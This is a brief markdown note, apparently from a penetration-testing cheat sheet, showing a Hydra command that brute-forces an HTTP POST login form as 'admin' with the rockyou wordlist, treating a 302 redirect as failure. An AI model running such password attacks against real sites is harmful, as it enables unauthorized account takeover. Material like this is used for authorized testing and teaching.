# Brute Force Login Forms with HYDRA
This module will contain the syntax used for successful brute force methods to a web application form.
## HTTP-POST-FORM
This can be used when an HTTP response of 302 (redirection) comes from a login failure:

`hydra -l admin -o TARGET-IP.hydra -P /wordlists/rockyou.txt (TARGT IP) http-post-form "/login.asp:username=^USER^&password=^PASS^&submit=Enter:F=302"`
